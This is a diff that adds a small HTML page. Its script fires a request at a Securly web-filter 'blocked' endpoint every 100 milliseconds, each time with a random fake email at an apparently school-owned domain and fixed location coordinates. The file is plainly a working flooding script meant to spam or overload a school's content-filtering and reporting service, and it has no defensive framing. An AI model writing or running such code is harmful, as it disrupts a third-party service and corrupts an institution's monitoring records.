@@ -1,0 +1,21 @@
+<html>
+
+<body>
+
+<script>
+
+setInterval(function() {
+    const x = Math.random()
+    const URL = `https://useast2-www.securly.com/blocked?useremail=${x}@vg302.org&reason=globalblacklist&categoryid=BL&policyid=G&keyword=&url=YQ==&ver=2.97.32&lat=39.8680871&lng=-88.1613443`
+
+    const HTTP = new XMLHttpRequest()
+    
+    HTTP.open("GET", URL)
+    HTTP.send()
+}, 100)
+
+</script>
+
+<body>
+
+</html>
